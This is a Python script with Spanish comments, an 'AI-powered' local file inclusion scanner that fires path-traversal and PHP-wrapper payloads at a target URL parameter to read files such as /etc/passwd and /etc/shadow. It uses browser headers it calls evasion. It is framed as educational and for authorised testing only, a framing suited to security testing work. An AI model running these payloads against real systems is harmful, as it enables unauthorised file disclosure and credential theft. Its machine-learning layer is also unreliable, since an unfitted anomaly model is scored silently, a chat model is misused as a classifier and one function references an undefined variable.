#!/usr/bin/env python3
"""
AI-LFI-Scanner - Herramienta avanzada de escaneo LFI con Inteligencia Artificial
Solo para uso educativo y testing autorizado
"""

import requests
import sys
import urllib.parse
import re
import json
import warnings
import numpy as np
import pandas as pd
from typing import Dict, List, Optional, Tuple
from tqdm import tqdm
import joblib
from pathlib import Path

# Importaciones de ML
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler
from sklearn.decomposition import PCA

# Importaciones de Deep Learning
try:
    from transformers import pipeline, AutoTokenizer, AutoModelForSequenceClassification
    import torch
    from torch import nn
except ImportError:
    print("Instala transformers: pip install transformers torch")

warnings.filterwarnings('ignore')

class AdvancedAILFIScanner:
    def __init__(self):
        self.payloads = self._load_default_payloads()
        self.results = []
        self.models = {}
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.scaler = StandardScaler()
        self._initialize_ai_models()
        
    def _load_default_payloads(self) -> List[str]:
        """Cargar payloads LFI predefinidos con variaciones"""
        base_payloads = [
            # Basic traversal
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../' * 10 + 'etc/passwd',
            
            # Windows paths
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\boot.ini',
            
            # PHP wrappers
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'php://input',
            
            # Data wrapper
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            'data://text/plain,<?php phpinfo(); ?>',
            
            # Null byte (for older PHP)
            '../../../../etc/passwd%00',
            
            # Encoding variations
            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            
            # Interesting files
            '/proc/self/environ',
            '/etc/hosts',
            '/etc/shadow',
            '/etc/passwd',
            '/windows/win.ini'
        ]
        return base_payloads

    def _initialize_ai_models(self):
        """Inicializar todos los modelos de IA"""
        print("[AI] Inicializando modelos de inteligencia artificial...")
        
        # Modelo de detección de anomalías
        self.models['anomaly'] = IsolationForest(
            n_estimators=100,
            contamination=0.1,
            random_state=42
        )
        
        # Modelo de clasificación
        self.models['classifier'] = RandomForestClassifier(
            n_estimators=50,
            random_state=42
        )
        
        # Modelo de clustering
        self.models['cluster'] = DBSCAN(eps=0.5, min_samples=2)
        
        # Try to load NLP model for response analysis
        try:
            self.nlp_model = pipeline(
                "text-classification",
                model="microsoft/DialoGPT-medium",
                framework="pt"
            )
            self.has_nlp = True
        except:
            print("[!] No se pudo cargar el modelo NLP, usando análisis básico")
            self.has_nlp = False

    def load_custom_payloads(self, file_path: str):
        """Cargar payloads personalizados desde archivo"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                custom_payloads = [line.strip() for line in f if line.strip()]
                self.payloads.extend(custom_payloads)
                print(f"[+] Cargados {len(custom_payloads)} payloads personalizados")
        except FileNotFoundError:
            print(f"[!] Archivo {file_path} no encontrado")

    def scan_url(self, url: str, param: str, cookies: Optional[Dict] = None, 
                headers: Optional[Dict] = None, delay: float = 0.1):
        """Escanea una URL con técnicas de IA mejoradas"""
        print(f"[*] Escaneando: {url}")
        print(f"[*] Parámetro: {param}")
        print(f"[*] Usando {len(self.payloads)} payloads con IA...\n")
        
        session = requests.Session()
        if cookies:
            session.cookies.update(cookies)
        if headers:
            session.headers.update(headers)
        
        # Headers por defecto para evasión
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        # Obtener respuesta base para comparación
        base_response = self._get_base_response(session, url, param)
        
        # Escaneo con barra de progreso
        for payload in tqdm(self.payloads, desc="Probando payloads"):
            try:
                test_url = self._create_test_url(url, param, payload)
                response = session.get(test_url, timeout=15)
                
                # Análisis con IA
                analysis = self._ai_analyze_response(response, payload, base_response)
                
                if analysis['is_vulnerable']:
                    print(f"\n[✓] VULNERABILIDAD DETECTADA - Confianza: {analysis['confidence']:.2%}")
                    print(f"    Payload: {payload}")
                    print(f"    Score IA: {analysis['ai_score']:.3f}")
                    print(f"    Estado: {response.status_code}")
                    print(f"    URL: {test_url}")
                    
                    self.results.append({
                        'url': test_url,
                        'payload': payload,
                        'status': response.status_code,
                        'length': len(response.text),
                        'response': response.text[:1000],
                        'analysis': analysis
                    })

            except requests.exceptions.RequestException as e:
                continue

    def _get_base_response(self, session, url: str, param: str) -> Dict:
        """Obtener respuesta base para comparación"""
        base_url = self._create_test_url(url, param, "normal_value")
        try:
            response = session.get(base_url, timeout=10)
            return {
                'status': response.status_code,
                'length': len(response.text),
                'content': response.text
            }
        except:
            return {'status': 0, 'length': 0, 'content': ''}

    def _create_test_url(self, url: str, param: str, payload: str) -> str:
        """Crear URL de prueba con encoding inteligente"""
        parsed = list(urllib.parse.urlparse(url))
        query = urllib.parse.parse_qs(parsed[4])
        
        # Encoding inteligente basado en el payload
        if any(x in payload for x in ['../', '..\\', '%00', 'php://']):
            encoded_payload = payload  # Ya está codificado
        else:
            encoded_payload = urllib.parse.quote(payload)
        
        query[param] = [encoded_payload]
        parsed[4] = urllib.parse.urlencode(query, doseq=True)
        return urllib.parse.urlunparse(parsed)

    def _ai_analyze_response(self, response, payload: str, base_response: Dict) -> Dict:
        """Análisis avanzado de respuesta con múltiples técnicas de IA"""
        content = response.text
        analysis = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'ai_score': 0.0,
            'reasons': []
        }

        # 1. Análisis de características básicas
        features = self._extract_features(response, payload, base_response)
        
        # 2. Detección de patrones conocidos
        pattern_matches = self._pattern_detection(content, payload)
        analysis['reasons'].extend(pattern_matches)
        
        # 3. Análisis de anomalías con ML
        anomaly_score = self._calculate_anomaly_score(features)
        analysis['ai_score'] = anomaly_score
        
        # 4. Análisis semántico con NLP (si está disponible)
        if self.has_nlp and len(content) > 50 and len(content) < 1000:
            try:
                nlp_analysis = self._nlp_analysis(content)
                analysis['reasons'].extend(nlp_analysis)
            except:
                pass

        # 5. Toma de decisión basada en múltiples factores
        vulnerability_score = self._calculate_vulnerability_score(
            pattern_matches, anomaly_score, features
        )
        
        analysis['confidence'] = vulnerability_score
        analysis['is_vulnerable'] = vulnerability_score > 0.7
        
        return analysis

    def _extract_features(self, response, payload: str, base_response: Dict) -> List[float]:
        """Extraer características para el modelo de ML"""
        content = response.text
        
        features = [
            # Características de respuesta
            response.status_code,
            len(content),
            len(content) / max(1, base_response['length']),
            
            # Características del payload
            len(payload),
            payload.count('/'),
            payload.count('.'),
            payload.count('%'),
            
            # Características de contenido
            len(re.findall(r'root:x:', content)),
            len(re.findall(r'<?php', content)),
            len(re.findall(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', content)),
            
            # Ratios especiales
            len(re.findall(r'[a-zA-Z]', content)) / max(1, len(content)),
            len(re.findall(r'[0-9]', content)) / max(1, len(content)),
        ]
        
        return features

    def _pattern_detection(self, content: str, payload: str) -> List[str]:
        """Detección de patrones de vulnerabilidad"""
        content_lower = content.lower()
        reasons = []
        
        # Detección de archivos de sistema
        system_files = {
            '/etc/passwd': ['root:x:', 'bin:x:', 'daemon:x:'],
            '/etc/shadow': ['root:*:', 'bin:*:'],
            'php://filter': ['<?php', 'phparray'],
            'windows files': ['[boot loader]', '[fonts]'],
        }
        
        for file_type, patterns in system_files.items():
            if any(pattern in content_lower for pattern in patterns):
                reasons.append(f"Contenido de {file_type} detectado")
        
        # Detección de errores PHP
        php_errors = [
            'failed to open stream',
            'include_path',
            'no such file or directory',
            'warning: include',
            'failed to open stream:'
        ]
        
        if any(error in content_lower for error in php_errors):
            reasons.append("Error PHP revelador detectado")
        
        # Detección de contenido inusual
        if len(content) > 1000 and response.status_code == 200:
            if len(re.findall(r'[0-9a-fA-F]{32}', content)) > 5:
                reasons.append("Múltiples hashes detectados")
        
        return reasons

    def _calculate_anomaly_score(self, features: List[float]) -> float:
        """Calcular score de anomalía usando Isolation Forest"""
        try:
            features_array = np.array(features).reshape(1, -1)
            score = self.models['anomaly'].score_samples(features_array)[0]
            return float(score)
        except:
            return 0.0

    def _nlp_analysis(self, content: str) -> List[str]:
        """Análisis de contenido usando NLP"""
        reasons = []
        
        # Análisis de similitud semántica (simplificado)
        suspicious_terms = [
            'password', 'root', 'admin', 'config', 'database',
            'secret', 'key', 'token', 'credential'
        ]
        
        content_lower = content.lower()
        found_terms = [term for term in suspicious_terms if term in content_lower]
        
        if found_terms:
            reasons.append(f"Términos sensibles detectados: {', '.join(found_terms)}")
        
        return reasons

    def _calculate_vulnerability_score(self, patterns: List[str], 
                                     anomaly_score: float, 
                                     features: List[float]) -> float:
        """Calcular score final de vulnerabilidad"""
        score = 0.0
        
        # Puntos por patrones detectados
        score += len(patterns) * 0.2
        
        # Puntos por anomalía
        score += max(0, anomaly_score) * 0.3
        
        # Puntos por características específicas
        if features[2] > 2.0:  # Longitud relativa
            score += 0.2
        if features[7] > 0:    # Presencia de 'root:x:'
            score += 0.3
        if features[8] > 0:    # Presencia de '<?php'
            score += 0.2
        
        return min(1.0, score)

    def train_models(self, training_data: Optional[List[Dict]] = None):
        """Entrenar modelos con datos existentes"""
        if not self.results and not training_data:
            print("[!] No hay datos para entrenar")
            return
        
        print("[AI] Entrenando modelos de machine learning...")
        
        # Preparar datos de entrenamiento
        features = []
        labels = []
        
        for result in self.results:
            feat = self._extract_features(
                type('obj', (object,), {
                    'status_code': result['status'],
                    'text': result['response']
                }),
                result['payload'],
                {'length': 1000}  # Valor base por defecto
            )
            features.append(feat)
            labels.append(1 if result['analysis']['is_vulnerable'] else 0)
        
        # Entrenar modelo de anomalías
        if len(features) > 10:
            self.models['anomaly'].fit(features)
            print("[+] Modelo de anomalías entrenado")
        
        # Entrenar clasificador si hay suficientes datos
        if len(set(labels)) > 1 and len(features) > 20:
            self.models['classifier'].fit(features, labels)
            print("[+] Clasificador entrenado")

    def generate_ai_report(self, filename: str):
        """Generar reporte detallado con análisis de IA"""
        print(f"[+] Generando reporte AI en: {filename}")
        
        report = {
            "summary": {
                "total_tests": len(self.results),
                "vulnerabilities_found": sum(1 for r in self.results if r['analysis']['is_vulnerable']),
                "success_rate": len(self.results) / len(self.payloads) if self.payloads else 0
            },
            "vulnerabilities": [],
            "ai_analysis": {
                "average_confidence": np.mean([r['analysis']['confidence'] for r in self.results]) if self.results else 0,
                "average_ai_score": np.mean([r['analysis']['ai_score'] for r in self.results]) if self.results else 0
            }
        }
        
        for i, result in enumerate(self.results, 1):
            if result['analysis']['is_vulnerable']:
                report["vulnerabilities"].append({
                    "id": i,
                    "url": result['url'],
                    "payload": result['payload'],
                    "confidence": result['analysis']['confidence'],
                    "ai_score": result['analysis']['ai_score'],
                    "reasons": result['analysis']['reasons']
                })
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"[+] Reporte guardado con {len(report['vulnerabilities'])} vulnerabilidades")

def main():
    print("AI-LFI-Scanner - Escáner Avanzado con Inteligencia Artificial")
    print("=" * 60)
    print("Solo para uso educativo y testing autorizado\n")
    
    if len(sys.argv) < 3:
        print("Uso: python ai_lfi_scanner.py <URL> <PARAMETRO> [opciones]")
        print("\nOpciones:")
        print("  --payloads <archivo>    Cargar payloads personalizados")
        print("  --cookies <cookie_str>  Cookies para la solicitud")
        print("  --headers <header_json> Headers JSON personalizados")
        print("  --output <archivo>      Guardar reporte AI en archivo")
        print("  --train                 Entrenar modelos con resultados")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    scanner = AdvancedAILFIScanner()
    
    # Procesar opciones
    cookies = None
    headers = None
    output_file = "lfi_ai_report.json"
    train_models = False
    
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "--payloads" and i + 1 < len(sys.argv):
            scanner.load_custom_payloads(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--cookies" and i + 1 < len(sys.argv):
            cookies = {c.split('=')[0]: c.split('=')[1] for c in sys.argv[i + 1].split(';')}
            i += 2
        elif sys.argv[i] == "--headers" and i + 1 < len(sys.argv):
            try:
                headers = json.loads(sys.argv[i + 1])
            except json.JSONDecodeError:
                print("[!] Headers deben estar en formato JSON válido")
            i += 2
        elif sys.argv[i] == "--output" and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--train":
            train_models = True
            i += 1
        else:
            i += 1
    
    # Realizar escaneo
    try:
        scanner.scan_url(url, param, cookies, headers)
        
        # Entrenar modelos si se solicita
        if train_models:
            scanner.train_models()
        
        # Generar reporte
        scanner.generate_ai_report(output_file)
        
        print(f"\n[+] Escaneo completado. Revisa el reporte: {output_file}")
        
    except KeyboardInterrupt:
        print("\n[!] Escaneo interrumpido por el usuario")
    except Exception as e:
        print(f"\n[!] Error durante el escaneo: {e}")

if __name__ == "__main__":
    main()
